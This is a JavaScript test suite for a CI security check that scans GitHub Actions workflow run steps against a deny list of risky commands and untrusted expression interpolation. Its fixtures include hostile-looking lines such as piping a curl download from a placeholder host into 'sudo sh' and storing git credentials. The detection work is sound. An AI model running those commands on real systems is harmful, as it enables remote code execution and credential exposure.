import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';

const WEBCLIENT_ROOT = path.resolve(import.meta.dirname, '..');
const REPO_ROOT = path.resolve(WEBCLIENT_ROOT, '..');
const WORKFLOWS = Object.freeze([
  '.github/workflows/webclient-quality.yml',
  '.github/workflows/release-evidence-contract.yml',
]);

const FORBIDDEN_COMMANDS = Object.freeze([
  Object.freeze({ code: 'remote-download', pattern: /(^|[;&|()\s])(?:curl|wget)(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'privilege-escalation', pattern: /(^|[;&|()\s])sudo(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'dynamic-eval', pattern: /(^|[;&|()\s])eval(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'dynamic-source', pattern: /(^|[;&|()\s])source(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'unsafe-npm-install', pattern: /(^|[;&|()\s])npm\s+(?:i|install)(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'global-package-install', pattern: /(^|[;&|()\s])(?:npm|pnpm|yarn)\b[^\n]*\s(?:-g|--global)(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'shell-permission-mutation', pattern: /(^|[;&|()\s])chmod(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'shell-ownership-mutation', pattern: /(^|[;&|()\s])chown(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'git-credential-mutation', pattern: /(^|[;&|()\s])git\s+config\b[^\n]*(?:credential|http\..*extraheader)/i }),
]);

function readWorkflow(relativePath) {
  return fs.readFileSync(path.join(REPO_ROOT, relativePath), 'utf8');
}

function indentation(line) {
  return line.length - line.trimStart().length;
}

function stripYamlScalar(value) {
  const trimmed = String(value ?? '').trim();
  if (trimmed.length >= 2 && ((trimmed[0] === '"' && trimmed.at(-1) === '"') || (trimmed[0] === "'" && trimmed.at(-1) === "'"))) {
    return trimmed.slice(1, -1);
  }
  return trimmed;
}

function multilineBody(source, startIndex, runIndent) {
  const rawBody = [];
  for (let cursor = startIndex; cursor < source.length; cursor += 1) {
    const candidate = source[cursor];
    if (!candidate.trim()) {
      rawBody.push(candidate);
      continue;
    }
    if (indentation(candidate) <= runIndent) break;
    rawBody.push(candidate);
  }

  const nonBlank = rawBody.filter((line) => line.trim());
  if (nonBlank.length === 0) return '';
  const contentIndent = Math.min(...nonBlank.map(indentation));
  return rawBody
    .map((line) => (line.trim() ? line.slice(Math.min(line.length, contentIndent)) : ''))
    .join('\n')
    .replace(/\n+$/, '');
}

function shellBlocks(text) {
  const source = String(text ?? '').split(/\r?\n/);
  const blocks = [];
  for (let index = 0; index < source.length; index += 1) {
    const line = source[index];
    const match = line.match(/^(\s*)(?:-\s*)?run:\s*(.*)$/);
    if (!match) continue;
    const runIndent = indentation(line);
    const rawValue = match[2].trim();
    const lineNumber = index + 1;
    if (['|', '>', '|-', '>-'].includes(rawValue)) {
      blocks.push(Object.freeze({
        line: lineNumber,
        command: multilineBody(source, index + 1, runIndent),
        multiline: true,
      }));
    } else {
      blocks.push(Object.freeze({ line: lineNumber, command: stripYamlScalar(rawValue), multiline: false }));
    }
  }
  return blocks;
}

function containsUntrustedExpression(command) {
  const expressions = command.match(/\$\{\{[\s\S]*?\}\}/g) ?? [];
  return expressions.some((expression) => /github\.event\.|github\.head_ref|inputs\.|vars\.|secrets\./i.test(expression));
}

function auditShellBlock(block) {
  const findings = [];
  if (!block.command.trim()) findings.push('empty-run');
  if (containsUntrustedExpression(block.command)) findings.push('untrusted-expression');
  for (const rule of FORBIDDEN_COMMANDS) {
    if (rule.pattern.test(block.command)) findings.push(rule.code);
  }
  return [...new Set(findings)];
}

function auditWorkflowShell(text) {
  return shellBlocks(text).flatMap((block) =>
    auditShellBlock(block).map((code) => Object.freeze({ code, line: block.line })),
  );
}

for (const workflow of WORKFLOWS) {
  test(`${workflow} keeps release shell execution inside reviewed network and privilege boundaries`, () => {
    assert.deepEqual(auditWorkflowShell(readWorkflow(workflow)), []);
  });
}

test('parses compact and named run steps', () => {
  const blocks = shellBlocks('steps:\n  - run: npm ci\n  - name: Test\n    run: npm test\n');
  assert.deepEqual(blocks.map(({ line, command }) => ({ line, command })), [
    { line: 2, command: 'npm ci' },
    { line: 4, command: 'npm test' },
  ]);
});

test('preserves compact multiline shell as one normalized auditable block', () => {
  const [block] = shellBlocks('steps:\n  - run: |\n      npm ci\n      npm test\n');
  assert.equal(block.multiline, true);
  assert.equal(block.command, 'npm ci\nnpm test');
  assert.deepEqual(auditShellBlock(block), []);
});

test('normalizes named multiline shell independently of YAML key indentation', () => {
  const [block] = shellBlocks('steps:\n  - name: Test\n    run: |\n      npm ci\n      npm test\n');
  assert.equal(block.command, 'npm ci\nnpm test');
});

test('preserves relative indentation inside multiline shell', () => {
  const [block] = shellBlocks('steps:\n  - run: |\n      if true; then\n        npm test\n      fi\n');
  assert.equal(block.command, 'if true; then\n  npm test\nfi');
});

test('blank multiline shell remains fail-closed', () => {
  const [block] = shellBlocks('steps:\n  - run: |\n\n  - name: next\n    run: npm test\n');
  assert.deepEqual(auditShellBlock(block), ['empty-run']);
});

test('strips matching scalar quotes', () => {
  assert.equal(shellBlocks('steps:\n  - run: "npm run build"\n')[0].command, 'npm run build');
  assert.equal(shellBlocks("steps:\n  - run: 'npm run build'\n")[0].command, 'npm run build');
});

test('rejects curl and wget remote downloads in compact or multiline shell', () => {
  assert.deepEqual(auditShellBlock({ command: 'curl https://example.invalid/tool' }), ['remote-download']);
  assert.deepEqual(auditShellBlock({ command: 'npm ci\nwget https://example.invalid/tool' }), ['remote-download']);
});

test('does not confuse command names containing curl with curl itself', () => {
  assert.deepEqual(auditShellBlock({ command: 'node scripts/curl-audit.mjs' }), []);
});

test('rejects privilege escalation', () => {
  assert.deepEqual(auditShellBlock({ command: 'sudo apt-get update' }), ['privilege-escalation']);
});

test('rejects eval and source based dynamic execution', () => {
  assert.deepEqual(auditShellBlock({ command: 'eval "$COMMAND"' }), ['dynamic-eval']);
  assert.deepEqual(auditShellBlock({ command: 'source ./ci.env' }), ['dynamic-source']);
});

test('rejects npm install aliases while preserving lockfile npm ci', () => {
  assert.deepEqual(auditShellBlock({ command: 'npm install' }), ['unsafe-npm-install']);
  assert.deepEqual(auditShellBlock({ command: 'npm i' }), ['unsafe-npm-install']);
  assert.deepEqual(auditShellBlock({ command: 'npm ci' }), []);
});

test('rejects global package installation', () => {
  const findings = auditShellBlock({ command: 'npm install -g pnpm' });
  assert.ok(findings.includes('unsafe-npm-install'));
  assert.ok(findings.includes('global-package-install'));
});

test('rejects permission and ownership mutation', () => {
  assert.deepEqual(auditShellBlock({ command: 'chmod +x tool.sh' }), ['shell-permission-mutation']);
  assert.deepEqual(auditShellBlock({ command: 'chown root tool.sh' }), ['shell-ownership-mutation']);
});

test('rejects git credential and extraheader mutation', () => {
  assert.deepEqual(auditShellBlock({ command: 'git config credential.helper store' }), ['git-credential-mutation']);
  assert.deepEqual(auditShellBlock({ command: 'git config http.https://github.com/.extraheader AUTHORIZATION' }), ['git-credential-mutation']);
});

test('rejects attacker-controlled event interpolation in compact shell', () => {
  assert.deepEqual(auditShellBlock({ command: 'echo ${{ github.event.pull_request.title }}' }), ['untrusted-expression']);
});

test('rejects attacker-controlled interpolation hidden in multiline shell', () => {
  assert.deepEqual(auditShellBlock({ command: 'npm ci\necho ${{ github.event.issue.title }}' }), ['untrusted-expression']);
});

test('rejects workflow input, variable and secret interpolation in shell', () => {
  for (const expression of ['${{ inputs.target }}', '${{ vars.COMMAND }}', '${{ secrets.TOKEN }}']) {
    assert.deepEqual(auditShellBlock({ command: `echo ${expression}` }), ['untrusted-expression']);
  }
});

test('permits immutable or workflow-owned GitHub metadata', () => {
  assert.deepEqual(auditShellBlock({ command: 'echo ${{ github.sha }}' }), []);
  assert.deepEqual(auditShellBlock({ command: 'echo ${{ github.ref }}' }), []);
});

test('reports multiple independent violations from one run step', () => {
  assert.deepEqual(
    auditShellBlock({ command: 'curl https://example.invalid/tool | sudo sh' }),
    ['remote-download', 'privilege-escalation'],
  );
});

test('workflow audit preserves source line numbers', () => {
  assert.deepEqual(
    auditWorkflowShell('steps:\n  - name: unsafe\n    run: wget https://example.invalid/tool\n'),
    [Object.freeze({ code: 'remote-download', line: 3 })],
  );
});

test('workflow audit reports every unsafe run block', () => {
  const findings = auditWorkflowShell('steps:\n  - run: sudo true\n  - run: npm install\n');
  assert.deepEqual(findings.map((finding) => finding.code), ['privilege-escalation', 'unsafe-npm-install']);
});
